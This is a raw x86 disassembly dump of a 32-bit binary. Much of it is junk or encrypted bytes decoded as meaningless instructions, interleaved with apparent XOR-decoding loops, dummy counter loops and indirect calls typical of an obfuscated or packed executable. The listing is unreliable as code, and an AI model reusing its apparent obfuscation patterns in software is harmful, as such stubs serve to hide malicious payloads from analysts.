  4029c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029c9:	pop    ecx
  4029ca:	mov    ebx,0xd011837f
  4029cf:	add    dh,BYTE PTR [ebx]
  4029d1:	pop    ebx
  4029d2:	xchg   ebx,eax
  4029d3:	jnp    0x402a3a
  4029d5:	push   0x384f5333
  4029da:	jecxz  0x402998
  4029dc:	inc    edx
  4029dd:	fs test eax,0x3af58af8
  4029e3:	fdivr  st(6),st
  4029e5:	push   edx
  4029e6:	xor    ecx,DWORD PTR [edx]
  4029e8:	cli    
  4029e9:	aam    0x5
  4029eb:	sbb    al,0xaa
  4029ed:	mov    dl,al
  4029ef:	fisubr DWORD PTR ds:0x99a39566
  4029f5:	leave  
  4029f6:	sbb    dh,BYTE PTR [esi+0x6f]
  4029f9:	jbe    0x4029c3
  4029fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029fc:	in     eax,dx
  4029fd:	jmp    0xf4d6:0x45c7ea31
  402a04:	enter  0xcf4d,0x75
  402a08:	das    
  402a09:	adc    BYTE PTR [edx+0x3009051],dh
  402a0f:	jge    0x402a21
  402a11:	xor    edx,ecx
  402a13:	add    edx,esi
  402a15:	cmp    edx,edi
  402a17:	ja     0x402e5d
  402a1d:	push   ebx
  402a1e:	jmp    0x402a28
  402a23:	mov    esi,0x32729b
  402a28:	mov    eax,DWORD PTR [ebp-0x8]
  402a2b:	mov    edi,DWORD PTR [ebp-0x4]
  402a2e:	jmp    0x402c26
  402a33:	lock ss inc eax
  402a36:	xor    al,0x40
  402a38:	jo     0x402aaa
  402a3a:	repnz push ss
  402a3c:	pop    ds
  402a3d:	mov    ds:0x67942380,al
  402a42:	and    eax,0x7e7e0c68
  402a47:	push   ebp
  402a48:	jg     0x402ac8
  402a4a:	jle    0x402a8b
  402a4c:	xchg   esi,eax
  402a4d:	jo     0x402a00
  402a4f:	dec    esi
  402a50:	mov    esp,0xde6b7e93
  402a55:	(bad)  
  402a56:	cli    
  402a57:	cld    
  402a58:	and    BYTE PTR [esi+0x59],al
  402a5b:	sub    al,0xc
  402a5d:	xor    ebx,edx
  402a5f:	push   es
  402a60:	loope  0x402a97
  402a62:	pushf  
  402a63:	test   BYTE PTR [esi+0x18],0x9a
  402a67:	xchg   ebx,eax
  402a68:	dec    edx
  402a69:	out    0x7f,al
  402a6b:	xlat   BYTE PTR ds:[ebx]
  402a6c:	mov    DWORD PTR [esi-0x4f42a5c6],esp
  402a72:	or     DWORD PTR [esi],esp
  402a74:	xchg   BYTE PTR [ebx+0x4cb3395],dl
  402a7a:	push   ebx
  402a7b:	mov    esp,0xdb9e1fa2
  402a80:	sbb    al,0xa5
  402a82:	ins    BYTE PTR es:[edi],dx
  402a83:	push   esp
  402a84:	les    edx,FWORD PTR [ecx-0x8]
  402a87:	icebp  
  402a88:	adc    esp,ecx
  402a8a:	push   ebx
  402a8b:	pop    esi
  402a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a8d:	les    ecx,FWORD PTR [esi]
  402a8f:	cld    
  402a90:	jge    0x402ad9
  402a92:	je     0x402acf
  402a94:	jns    0x402acc
  402a96:	push   cs
  402a97:	stos   DWORD PTR es:[edi],eax
  402a98:	imul   ebx,esp,0xffffffed
  402a9b:	aas    
  402a9c:	lea    ebx,[esi+0x51]
  402a9f:	bound  ecx,QWORD PTR [edi]
  402aa1:	push   cs
  402aa2:	and    esp,esp
  402aa4:	and    ah,ah
  402aa6:	hlt    
  402aa7:	jne    0x402aa4
  402aa9:	xor    eax,0x2a0da89d
  402aae:	push   ds
  402aaf:	pop    esp
  402ab0:	sub    DWORD PTR ds:[ebp-0x4072bb4f],eax
  402ab7:	imul   ebx,DWORD PTR [ebx],0xffffffc3
  402aba:	pop    ss
  402abb:	in     eax,dx
  402abc:	cwde   
  402abd:	adc    BYTE PTR [eax],bh
  402abf:	add    BYTE PTR [ecx+0xa58b6f6],0x63
  402ac6:	pushf  
  402ac7:	jp     0x402b3c
  402ac9:	(bad)  
  402acb:	into   
  402acc:	cmp    dh,bl
  402ace:	daa    
  402acf:	mov    ebp,0x776579fe
  402ad4:	lods   eax,DWORD PTR ds:[esi]
  402ad5:	dec    edi
  402ad6:	sub    dl,dl
  402ad8:	jmp    0xb413:0x5481f277
  402adf:	leave  
  402ae0:	test   al,0x3b
  402ae2:	leave  
  402ae3:	or     DWORD PTR [eiz*2+0x472cbf88],edx
  402aea:	test   BYTE PTR [esi],bl
  402aec:	dec    ebx
  402aed:	test   BYTE PTR [esi],dl
  402aef:	xor    al,0x67
  402af1:	add    esi,DWORD PTR [esi+0x79924c45]
  402af7:	(bad)  
  402af8:	mov    eax,0x84f24e64
  402afd:	call   0x3a1cec07
  402b02:	mov    ebx,0x93794d0d
  402b07:	das    
  402b08:	icebp  
  402b09:	rcl    cl,1
  402b0b:	xchg   dl,bl
  402b0d:	test   BYTE PTR [ecx+0x22ce2a0],bh
  402b13:	mov    esi,0xe5ad13e7
  402b18:	call   0x2003:0xd259b496
  402b1f:	fs imul edx,edi,0x32
  402b23:	add    esp,ecx
  402b25:	mov    ebx,0xa790244
  402b2a:	retf   0x49bd
  402b2d:	rol    dl,0x58
  402b30:	sub    dh,BYTE PTR [eax-0x2f8c4944]
  402b36:	jns    0x402b0b
  402b38:	or     ebp,DWORD PTR [edi+0x3ed13e9d]
  402b3e:	es or  bh,cl
  402b41:	xchg   edi,eax
  402b42:	icebp  
  402b43:	jb     0x402b3d
  402b45:	ss dec esi
  402b47:	(bad)  
  402b48:	js     0x402b02
  402b4a:	sub    al,0xfa
  402b4c:	out    dx,al
  402b4d:	dec    ebp
  402b4e:	ret    0xed9
  402b51:	dec    ebp
  402b52:	and    bl,0x1b
  402b55:	push   0xffffff96
  402b57:	ins    DWORD PTR es:[edi],dx
  402b58:	daa    
  402b59:	or     eax,0x8565c544
  402b5e:	retf   
  402b5f:	xor    edx,esi
  402b61:	add    ebx,ecx
  402b63:	imul   esi,edi,0xffffff9f
  402b66:	(bad)  
  402b67:	stos   BYTE PTR es:[edi],al
  402b68:	pop    ecx
  402b69:	cmp    esi,esp
  402b6b:	lock sahf 
  402b6d:	inc    ecx
  402b6e:	cmp    eax,0xf8391a55
  402b73:	into   
  402b74:	adc    eax,0xe3485bec
  402b79:	jg     0x402b09
  402b7b:	xchg   edx,eax
  402b7c:	inc    ebp
  402b7d:	(bad)  
  402b7e:	jb     0x402b0d
  402b80:	fild   QWORD PTR [ebp-0x52]
  402b83:	push   ecx
  402b84:	fbld   TBYTE PTR [esi+edi*8-0x6c7b8fdd]
  402b8b:	pop    edx
  402b8c:	jp     0x402b30
  402b8e:	inc    edx
  402b8f:	xchg   ebp,eax
  402b90:	lods   al,BYTE PTR ds:[esi]
  402b91:	cmp    ecx,edx
  402b93:	add    DWORD PTR [eax-0x2],ecx
  402b96:	test   eax,0xbf26b9a3
  402b9b:	or     esp,esp
  402b9d:	inc    edi
  402b9e:	mov    edi,0xf20a3c0a
  402ba3:	arpl   WORD PTR [eax],di
  402ba5:	push   ds
  402ba6:	xchg   edi,esp
  402ba8:	cmp    eax,0x8f2d089e
  402bad:	pop    ss
  402bae:	leave  
  402baf:	inc    ecx
  402bb0:	mov    eax,ds:0xcb1e69b8
  402bb5:	retf   
  402bb6:	mov    ch,cl
  402bb8:	pop    ds
  402bb9:	stc    
  402bba:	pop    esi
  402bbb:	imul   ebp,esp,0xd224c8ff
  402bc1:	cs cwde 
  402bc3:	gs fdivr st,st(3)
  402bc6:	sbb    BYTE PTR [ebp-0x7f],ch
  402bc9:	popa   
  402bca:	dec    esp
  402bcb:	pusha  
  402bcc:	adc    al,0xa7
  402bce:	data16 test BYTE PTR [ebp-0x73],al
  402bd2:	xchg   BYTE PTR [ebx-0x5a],cl
  402bd5:	cli    
  402bd6:	sbb    edx,eax
  402bd8:	arpl   WORD PTR [ecx-0x41],cx
  402bdb:	out    dx,al
  402bdc:	xchg   ebp,eax
  402bdd:	stc    
  402bde:	sub    eax,0xcdbf0a75
  402be3:	sub    eax,0xb2e50cf
  402be8:	repz push ebx
  402bea:	retf   0xba64
  402bed:	mov    ah,BYTE PTR [ebx-0x648aa41e]
  402bf3:	imul   ebp
  402bf5:	stos   BYTE PTR es:[edi],al
  402bf6:	push   edi
  402bf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bf8:	loopne 0x402be3
  402bfa:	or     eax,edx
  402bfc:	das    
  402bfd:	je     0x402c2e
  402bff:	(bad)  
  402c01:	hlt    
  402c02:	fimul  DWORD PTR [eax-0x41]
  402c05:	xchg   ebp,eax
  402c06:	mov    edi,0xc560f3f
  402c0b:	jb     0x402c7d
  402c0d:	lods   al,BYTE PTR ds:[esi]
  402c0e:	sub    BYTE PTR ds:0x9a5b4342,bl
  402c14:	fisub  DWORD PTR [edx+0x50]
  402c17:	push   ds
  402c18:	jp     0x402ba0
  402c1a:	jnp    0x402be0
  402c1c:	cmp    bl,BYTE PTR [ecx]
  402c1e:	sbb    eax,0xb8f276f
  402c23:	lds    edi,FWORD PTR [ecx]
  402c25:	mov    bl,0x33
  402c27:	stc    
  402c28:	add    edi,esi
  402c2a:	mov    esi,DWORD PTR [ebp+0x8]
  402c2d:	imul   edi,edx
  402c30:	mov    ebx,DWORD PTR [ebp+0xc]
  402c33:	xor    eax,ecx
  402c35:	add    eax,edx
  402c37:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  402c3e:	mov    BYTE PTR [edi+esi*1],al
  402c41:	mov    eax,DWORD PTR [ebp-0x4]
  402c44:	xor    eax,ecx
  402c46:	lea    edx,[edx+eax*1+0x32729b]
  402c4d:	mov    eax,DWORD PTR [ebp-0x4]
  402c50:	xor    eax,ecx
  402c52:	mov    esi,0xffcd8d65
  402c57:	sub    esi,eax
  402c59:	jmp    0x402e51
  402c5e:	outs   dx,BYTE PTR ds:[esi]
  402c5f:	add    ebx,DWORD PTR [edi+0x6f72734e]
  402c65:	and    ebp,DWORD PTR [esi]
  402c67:	add    al,0x68
  402c69:	mov    dh,0x1d
  402c6b:	push   0xffffff86
  402c6d:	lods   al,BYTE PTR ds:[esi]
  402c6e:	dec    edi
  402c6f:	or     bh,BYTE PTR [esi+0x7e]
  402c72:	push   ebp
  402c73:	jg     0x402cf3
  402c75:	jle    0x402c82
  402c77:	fild   WORD PTR [ebp+esi*2+0x1b]
  402c7b:	retf   
  402c7c:	push   edi
  402c7d:	pushf  
  402c7e:	sub    BYTE PTR [edi+0x21],ah
  402c81:	pop    esp
  402c82:	aam    0x95
  402c84:	dec    ecx
  402c85:	imul   ebx,edx,0xadb83c62
  402c8b:	dec    ebx
  402c8c:	scas   al,BYTE PTR es:[edi]
  402c8d:	mov    ds:0xadf0e90d,al
  402c92:	or     al,0x80
  402c94:	aam    0x5e
  402c96:	pop    ds
  402c97:	cmp    DWORD PTR [ebx+esi*1-0x30],0xea5c4e3c
  402c9f:	mov    al,ah
  402ca1:	mov    ebx,0x69f72f6d
  402ca6:	mov    ds:0xf96dd5a4,al
  402cab:	xor    ebx,DWORD PTR [esi+0x3e]
  402cae:	add    DWORD PTR [edx-0x33],0xffffffe7
  402cb2:	push   0xffffffce
  402cb4:	clc    
  402cb5:	aas    
  402cb6:	xor    BYTE PTR [ebp+0x42],ah
  402cb9:	enter  0x2e0a,0xbb
  402cbd:	lea    ecx,[ecx+0x4c]
  402cc0:	mov    DWORD PTR [eax-0x24],ebp
  402cc3:	and    BYTE PTR [ebx-0xc3f2978],cl
  402cc9:	or     BYTE PTR [ebp+0x6f4117db],dh
  402ccf:	sahf   
  402cd0:	mov    BYTE PTR [ebx],dl
  402cd2:	scas   al,BYTE PTR es:[edi]
  402cd3:	fdivr  DWORD PTR ss:[ecx]
  402cd6:	dec    esi
  402cd7:	dec    esi
  402cd8:	sbb    ecx,DWORD PTR [ebx]
  402cda:	xor    al,0x16
  402cdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cdd:	mov    ebx,0xab6c7594
  402ce2:	mov    ds:0xb6cb20ba,al
  402ce7:	cli    
  402ce8:	cmc    
  402ce9:	in     al,0x35
  402ceb:	jns    0x402cb6
  402ced:	xchg   ch,al
  402cef:	aas    
  402cf0:	test   al,0x5f
  402cf2:	push   ebx
  402cf3:	jo     0x402d5d
  402cf5:	pop    ds
  402cf6:	out    dx,al
  402cf7:	or     dl,dh
  402cf9:	mov    esi,0x72df92d0
  402cfe:	inc    ebp
  402cff:	ja     0x402c99
  402d01:	or     bl,BYTE PTR [eax]
  402d03:	pop    ecx
  402d04:	pusha  
  402d05:	cli    
  402d06:	fdiv   st,st(3)
  402d08:	xchg   DWORD PTR [ebp-0x12be9f90],ebp
  402d0e:	test   BYTE PTR [ebx+eiz*1-0x5f9ac2b3],al
  402d15:	adc    eax,0xe1e0a9bf
  402d1a:	mov    edi,0xb454a768
  402d1f:	(bad)  
  402d20:	stc    
  402d21:	jecxz  0x402cbe
  402d23:	jae    0x402ccf
  402d25:	and    BYTE PTR [edx+0x1b8a3a95],ch
  402d2b:	rcr    esi,0x8d
  402d2e:	add    BYTE PTR [ecx],bh
  402d30:	js     0x402d45
  402d32:	inc    esi
  402d33:	adc    eax,ecx
  402d35:	jno    0x402d76
  402d37:	jl     0x402d4b
  402d39:	js     0x402cfc
  402d3b:	mov    ah,0x73
  402d3d:	ss popa 
  402d3f:	addr16 faddp st(4),st
  402d42:	dec    edx
  402d43:	xchg   ebp,eax
  402d44:	xchg   edx,eax
  402d45:	stc    
  402d46:	cmp    esp,edx
  402d48:	in     al,0x8
  402d4a:	xchg   esi,eax
  402d4b:	pop    eax
  402d4c:	dec    ecx
  402d4d:	sti    
  402d4e:	in     eax,dx
  402d4f:	pop    DWORD PTR [edx+0x590b9a3a]
  402d55:	es push 0xffffffcc
  402d58:	pop    edx
  402d59:	fxch   st(2)
  402d5b:	enter  0x6052,0x42
  402d5f:	pop    eax
  402d60:	call   0x3ae7:0x473c9cd5
  402d67:	hlt    
  402d68:	stos   BYTE PTR es:[edi],al
  402d69:	jle    0x402d12
  402d6b:	repz add al,0xd9
  402d6e:	out    dx,eax
  402d6f:	adc    DWORD PTR [ebx+0xa14c4c0],eax
  402d75:	mov    eax,ds:0xdc85d5da
  402d7a:	add    al,0xb9
  402d7c:	inc    ebx
  402d7d:	icebp  
  402d7e:	iret   
  402d7f:	aad    0xf0
  402d81:	ret    0xcd9c
  402d84:	jp     0x402df5
  402d86:	mov    ebp,0x5ccaf97d
  402d8b:	fucom  st(5)
  402d8d:	and    DWORD PTR [esi],edx
  402d8f:	pop    ebp
  402d90:	or     ecx,DWORD PTR [edx+edi*2+0x7bb9dac7]
  402d97:	and    eax,0xea0400f5
  402d9c:	mov    edx,0x5c43e0a0
  402da1:	sbb    eax,0x92d1b038
  402da6:	xor    al,0xf
  402da8:	cs push esp
  402daa:	out    0x3a,eax
  402dac:	or     BYTE PTR [edi-0x39],al
  402daf:	ja     0x402db2
  402db1:	and    eax,0xb042e19
  402db6:	pop    eax
  402db7:	pusha  
  402db8:	mov    esp,DWORD PTR [edx+0x46be2d34]
  402dbe:	mov    ebx,0x95b3a634
  402dc3:	inc    edx
  402dc4:	push   esp
  402dc5:	add    BYTE PTR [edi-0x5a],bh
  402dc8:	mov    ecx,0x48b53c19
  402dcd:	xchg   esi,eax
  402dce:	int    0x3
  402dd0:	ds or  eax,0x33ba4e4e
  402dd6:	mov    edx,0xc6970b1c
  402ddb:	push   ecx
  402ddc:	int    0x9b
  402dde:	push   ds
  402ddf:	inc    eax
  402de0:	shl    BYTE PTR [esi-0x5d2dd4a0],0x7c
  402de7:	loop   0x402df2
  402de9:	cs stc 
  402deb:	mov    al,ds:0x91c4e285
  402df0:	xchg   edi,eax
  402df1:	sbb    al,BYTE PTR [edi-0x76cc2b92]
  402df7:	jno    0x402e04
  402df9:	add    DWORD PTR [edx+0x4a],edx
  402dfc:	mov    cl,0xf7
  402dfe:	cli    
  402dff:	lods   al,BYTE PTR ds:[esi]
  402e00:	dec    edx
  402e01:	sidtd  [ecx]
  402e04:	xchg   edi,eax
  402e05:	push   cs
  402e06:	pushf  
  402e07:	js     0x402e67
  402e09:	test   eax,0xcc8a2994
  402e0e:	add    esi,DWORD PTR [eax]
  402e10:	dec    eax
  402e11:	add    al,0x60
  402e13:	mov    edx,0x67b811b
  402e18:	cmp    al,0x2a
  402e1a:	ja     0x402e4f
  402e1c:	lods   eax,DWORD PTR ds:[esi]
  402e1d:	mov    esi,0x93522b8
  402e22:	sub    eax,0xfe5a208c
  402e27:	fist   WORD PTR [ebx-0x12d4bac4]
  402e2d:	dec    ebp
  402e2e:	add    DWORD PTR [edi],0x7
  402e31:	push   ds
  402e32:	xchg   ecx,eax
  402e33:	sar    esp,cl
  402e35:	jb     0x402dea
  402e37:	pop    ebp
  402e38:	pop    eax
  402e39:	fst    QWORD PTR [ecx+0x9]
  402e3c:	out    dx,eax
  402e3d:	sar    BYTE PTR [eax+edx*4-0x2701e415],1
  402e44:	jns    0x402e50
  402e46:	mov    ch,0x96
  402e48:	mov    ebx,0x437c32e
  402e4d:	xchg   ebp,eax
  402e4e:	sub    eax,0x75038ea1
  402e53:	adc    BYTE PTR [ebx],bh
  402e55:	(bad)  
  402e56:	jbe    0x402a23
  402e5c:	pop    ebx
  402e5d:	mov    eax,0xf89c8532
  402e62:	pop    edi
  402e63:	pop    esi
  402e64:	leave  
  402e65:	ret    0xc
  402e68:	push   ebp
  402e69:	mov    ebp,esp
  402e6b:	sub    esp,0x58
  402e6e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e71:	mov    eax,0x8a3c
  402e76:	xor    ax,WORD PTR [ecx+0x20]
  402e7a:	mov    ecx,0x3b02
  402e7f:	add    ax,cx
  402e82:	or     DWORD PTR ds:0x42e650,edi
  402e88:	movzx  eax,ax
  402e8b:	mov    ecx,DWORD PTR ds:0x4302b5
  402e91:	xor    ecx,DWORD PTR ds:0x42ec53
  402e97:	mov    DWORD PTR ds:0x4302b5,ecx
  402e9d:	mov    DWORD PTR [ebp-0xc],eax
  402ea0:	mov    BYTE PTR [ebp-0x1],0x7f
  402ea4:	sub    ecx,0x18d2
  402eaa:	lea    eax,[ebp-0x1]
  402ead:	and    DWORD PTR ds:0x42ec6f,0x0
  402eb7:	jmp    0x402ec9
  402ebc:	mov    ecx,DWORD PTR ds:0x42ec6f
  402ec2:	inc    ecx
  402ec3:	mov    DWORD PTR ds:0x42ec6f,ecx
  402ec9:	cmp    DWORD PTR ds:0x42ec6f,0x18
  402ed0:	jae    0x402fa2
  402ed6:	cmp    DWORD PTR ds:0x42ec6f,0x1a
  402edd:	jne    0x402eee
  402ee3:	push   0x2d42
  402ee8:	call   DWORD PTR ds:0x42e91b
  402eee:	jmp    0x402ebc
  402ef3:	mov    DWORD PTR ds:0x42ec67,0x17
  402efd:	cmp    DWORD PTR ds:0x42ec67,0x0
  402f04:	je     0x402fa2
  402f0a:	cmp    DWORD PTR ds:0x42ec67,0x7
  402f11:	jne    0x402f2c
  402f17:	push   0x25f8
  402f1c:	push   0x4302c9
  402f21:	push   0x42e737
  402f26:	call   DWORD PTR ds:0x42e833
  402f2c:	cmp    DWORD PTR ds:0x42ec67,0x8
  402f33:	jne    0x402f48
  402f39:	xor    ecx,ecx
  402f3b:	or     ecx,DWORD PTR ds:0x42ec67
  402f41:	dec    ecx
  402f42:	mov    DWORD PTR ds:0x42ec67,ecx
  402f48:	mov    ecx,DWORD PTR ds:0x42ec67
  402f4e:	dec    ecx
  402f4f:	mov    DWORD PTR ds:0x42ec67,ecx
  402f55:	jmp    0x402efd
  402f5a:	and    DWORD PTR ds:0x42ec4f,0x0
  402f64:	mov    ecx,DWORD PTR ds:0x42ec4f
  402f6a:	inc    ecx
  402f6b:	mov    DWORD PTR ds:0x42ec4f,ecx
  402f71:	cmp    DWORD PTR ds:0x42ec4f,0x16
  402f78:	jne    0x402f8f
  402f7e:	push   DWORD PTR [ebp-0xc]
  402f81:	push   0x4302ed
  402f86:	push   DWORD PTR [ebp-0x24]
  402f89:	call   DWORD PTR ds:0x42e847
  402f8f:	cmp    DWORD PTR ds:0x42ec4f,0x10
  402f96:	jb     0x402f64
  402f9c:	add    DWORD PTR ds:0x42ec4b,ebx
  402fa2:	mov    DWORD PTR [ebp-0x10],eax
  402fa5:	mov    DWORD PTR ds:0x4302d5,0x10
  402faf:	cmp    DWORD PTR ds:0x4302d5,0x0
  402fb6:	je     0x403010
  402fbc:	cmp    DWORD PTR ds:0x4302d5,0x4
  402fc3:	jne    0x402fda
  402fc9:	push   DWORD PTR [ebp-0x1c]
  402fcc:	push   DWORD PTR [ebp-0x20]
  402fcf:	push   0x42e6ad
  402fd4:	call   DWORD PTR ds:0x42e84b
  402fda:	cmp    DWORD PTR ds:0x4302d5,0x5
  402fe1:	jne    0x402ff4
  402fe7:	mov    ecx,DWORD PTR ds:0x4302d5
  402fed:	dec    ecx
  402fee:	mov    DWORD PTR ds:0x4302d5,ecx
  402ff4:	mov    ecx,DWORD PTR ds:0x4302d5
  402ffa:	dec    ecx
  402ffb:	mov    DWORD PTR ds:0x4302d5,ecx
  403001:	jmp    0x402faf
  403006:	and    DWORD PTR ds:0x4302ed,0x3a0f
  403010:	mov    al,BYTE PTR [ebp-0x1]
  403013:	mov    ecx,DWORD PTR ds:0x42e640
  403019:	add    DWORD PTR ds:0x42ec73,ecx
  40301f:	mov    ecx,DWORD PTR [ebp-0x10]
  403022:	mov    DWORD PTR ds:0x43035b,0x1b71
  40302c:	xor    al,0x46
  40302e:	sub    al,0x38
  403030:	or     DWORD PTR ds:0x42e648,0x7677
  40303a:	mov    BYTE PTR [ecx],al
  40303c:	not    eax
  40303e:	jmp    0x40320b
  403043:	loop   0x40305e
  403045:	fcom   DWORD PTR [ebp+0x697355e1]
  40304b:	popf   
  40304c:	mov    DWORD PTR [ecx-0x48],ebp
  40304f:	pop    ebx
  403050:	jnp    0x403087
  403052:	mov    ah,0xa2
  403054:	or     BYTE PTR [esi+0x7e],bh
  403057:	scas   al,BYTE PTR es:[edi]
  403058:	jg     0x4030d8
  40305a:	jle    0x40300f
  40305c:	in     eax,0xf5
  40305e:	pop    edi
  40305f:	sub    cl,bh
  403061:	xor    DWORD PTR [ecx+edx*4+0x1],esi
  403065:	sti    
  403066:	scas   al,BYTE PTR es:[edi]
  403067:	push   ebx
  403068:	ss mov ch,0xf4
  40306b:	push   eax
  40306c:	add    ebp,esp
  40306e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40306f:	imul   DWORD PTR [ebx+0x10]
  403072:	cli    
  403073:	or     al,0x31
  403075:	mov    bh,0x64
  403077:	adc    ebp,esp
  403079:	popf   
  40307a:	xor    DWORD PTR [esi+edx*8-0x24],esi
  40307e:	sti    
  40307f:	push   edi
  403080:	inc    esi
  403081:	pop    esp
  403082:	push   ecx
  403083:	pop    esi
  403084:	test   DWORD PTR [esi+eiz*4+0x6a],0x6805ea7c
  40308c:	xchg   edi,eax
  40308d:	xchg   ebp,eax
  40308e:	jmp    FWORD PTR [eax+0x1f2284e8]
  403094:	(bad)  
  403095:	jo     0x403084
  403097:	pop    esi
  403098:	dec    esp
  403099:	(bad)  
  40309b:	popa   
  40309c:	push   edi
  40309d:	ds icebp 
  40309f:	mov    cl,0xd2
  4030a1:	in     al,dx
  4030a2:	stc    
  4030a3:	inc    esi
  4030a4:	xchg   BYTE PTR [ebp-0x7b],dl
  4030a7:	inc    esp
  4030a8:	rcr    ah,cl
  4030aa:	mov    ecx,0x7d94af96
  4030af:	jg     0x4030b4
  4030b1:	jmp    0xbbf1c9a2
  4030b6:	shl    eax,1
  4030b8:	and    esi,DWORD PTR [ecx]
  4030ba:	and    DWORD PTR ds:0x1ede8311,eax
  4030c0:	lods   eax,DWORD PTR ds:[esi]
  4030c1:	aad    0x6
  4030c3:	bound  edx,QWORD PTR [esp+ebp*4+0x9]
  4030c7:	arpl   WORD PTR [edx-0x3fd6fcf5],si
  4030cd:	dec    ebp
  4030ce:	(bad)  
  4030cf:	outs   dx,BYTE PTR ds:[esi]
  4030d0:	adc    al,0x31
  4030d2:	bound  ecx,QWORD PTR [edx+0x8e44414]
  4030d8:	std    
  4030d9:	repz mov esi,DWORD PTR ds:0x9364ccd
  4030e0:	arpl   WORD PTR [edi+0x142e5897],cx
  4030e6:	ja     0x4030e5
  4030e8:	cmp    BYTE PTR [edi],bh
  4030ea:	fldcw  WORD PTR [edx-0x3b]
  4030ed:	scas   al,BYTE PTR es:[edi]
  4030ee:	addr16 mov eax,ds:0x58f0
  4030f2:	and    BYTE PTR [eax+0x47dd3cf6],0x2
  4030f9:	and    ch,bh
  4030fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030fc:	mov    ds:0xb979255a,al
  403101:	shr    ch,1
  403103:	daa    
  403104:	xor    al,BYTE PTR [ebx-0x2a]
  403107:	xor    esi,DWORD PTR [edi+eiz*4+0x7a]
  40310b:	arpl   WORD PTR [ebp+edx*8+0x74],si
  40310f:	mov    eax,ds:0xc599bdf
  403114:	push   esp
  403115:	pop    ds
  403116:	pop    es
  403117:	enter  0x62bc,0x2d
  40311b:	fisttp WORD PTR [edi]
  40311d:	pop    ebp
  40311e:	push   es
  40311f:	mov    al,ds:0x83b1cff0
  403124:	lahf   
  403125:	rol    BYTE PTR [ebx+0x46],cl
  403128:	test   DWORD PTR [edx*2-0x7b4230b2],esi
  40312f:	push   eax
  403130:	and    dl,BYTE PTR [esi]
  403132:	mov    edx,0x2b8d6d48
  403137:	sub    BYTE PTR [esi-0x6e],dh
  40313a:	jnp    0x403179
  40313c:	cdq    
  40313d:	pop    ebx
  40313e:	jle    0x4030c3
  403140:	in     eax,0x59
  403142:	jbe    0x403102
  403144:	popa   
  403145:	and    dh,dh
  403147:	scas   al,BYTE PTR es:[edi]
  403148:	mov    al,0x56
  40314a:	or     BYTE PTR [ebp-0x37],bl
  40314d:	out    0x3a,eax
  40314f:	xor    cl,ch
  403151:	jb     0x403184
  403153:	pushf  
  403154:	jle    0x403195
  403156:	xor    DWORD PTR [ebp+0x52],edi
  403159:	in     al,dx
  40315a:	in     al,dx
  40315b:	push   0x770c4971
  403160:	(bad)  
  403161:	retf   
  403162:	jns    0x403129
  403164:	out    dx,al
  403165:	and    al,0xc9
  403167:	cmc    
  403168:	push   ebx
  403169:	xor    ch,BYTE PTR [edi+0x0]
  40316c:	call   0xa34:0xcbce
  403172:	jge    0x403112
  403174:	push   es
  403175:	and    DWORD PTR [ebp-0x6209627d],edi
  40317b:	or     ebp,DWORD PTR [ecx+0x677d2346]
  403181:	push   eax
  403182:	xchg   cl,ah
  403184:	push   esp
  403185:	std    
  403186:	shl    BYTE PTR [edx+ecx*1+0x3c00caf5],cl
  40318d:	in     eax,0x8a
  40318f:	mov    DWORD PTR [edx],esi
  403191:	lods   eax,DWORD PTR ds:[esi]
  403192:	push   esp
  403193:	test   eax,edi
  403195:	pop    edi
  403196:	es call 0x3322277a
  40319c:	mov    al,0x2d
  40319e:	pop    esi
  40319f:	aaa    
  4031a0:	mov    bh,0x7d
  4031a2:	scas   al,BYTE PTR es:[edi]
  4031a3:	and    ecx,ebp
  4031a5:	pop    ss
  4031a6:	cmp    ebp,edi
  4031a8:	data16 fisub WORD PTR [edx+0x70]
  4031ac:	jmp    0x64f559ed
  4031b1:	jo     0x403157
  4031b3:	sub    bl,BYTE PTR [edx]
  4031b5:	push   0xf8ab0f0e
  4031ba:	adc    al,0x2b
  4031bc:	mov    ah,0x80
  4031be:	push   ebp
  4031bf:	std    
  4031c0:	aas    
  4031c1:	adc    eax,0xf6341600
  4031c6:	adc    ecx,DWORD PTR [edx-0xd6b5859]
  4031cc:	add    eax,0x7eb2d888
  4031d1:	jb     0x403210
  4031d3:	imul   edi,esi,0xc340b959
  4031d9:	pushf  
  4031da:	addr16 xchg esp,eax
  4031dc:	add    DWORD PTR [eax],edx
  4031de:	dec    edi
  4031df:	(bad)  [edi]
  4031e1:	imul   edx,esi,0xc805b98c
  4031e7:	mov    bl,0x3f
  4031e9:	call   0x96bc:0xe2997497
  4031f0:	loope  0x4031c4
  4031f2:	pusha  
  4031f3:	(bad)  
  4031f4:	int3   
  4031f5:	jl     0x403251
  4031f7:	fisttp WORD PTR [edx+ecx*1-0x7c167b29]
  4031fe:	xchg   DWORD PTR [edx],ecx
  403200:	cmp    ebx,edi
  403202:	shr    bl,cl
  403204:	xchg   esp,eax
  403205:	lods   eax,DWORD PTR ds:[esi]
  403206:	dec    esp
  403207:	not    ebp
  403209:	cli    
  40320a:	loopne 0x4031d3
  40320c:	inc    ebp
  40320d:	clc    
  40320e:	xor    DWORD PTR [ebp+0x45c7f89c],eax
  403214:	lock xor al,BYTE PTR [ebp+0xd09f89c]
  40321b:	outs   dx,DWORD PTR ds:[esi]
  40321c:	in     al,dx
  40321d:	inc    edx
  40321e:	add    BYTE PTR [ebx-0x48f007bb],cl
  403224:	or     eax,0x42ec4b
  403229:	adc    DWORD PTR ds:0x430357,ecx
  40322f:	mov    ecx,0x7510854
  403234:	sub    DWORD PTR ds:0x42e648,0x77ef
  40323e:	push   esi
  40323f:	xor    eax,ecx
  403241:	and    DWORD PTR ds:0x4302e1,0x33b1
  40324b:	jmp    0x403418
  403250:	inc    ecx
  403251:	jp     0x4031f4
  403253:	cs popa 
  403255:	mov    ch,0x51
  403257:	jno    0x403251
  403259:	(bad)  
  40325b:	pop    edi
  40325c:	aam    0x7
  40325e:	mov    DWORD PTR [eax-0x2e],esi
  403261:	push   ss
  403262:	jle    0x4032e2
  403264:	scas   al,BYTE PTR es:[edi]
  403265:	jg     0x4032e5
  403267:	jle    0x4032a8
  403269:	ret    
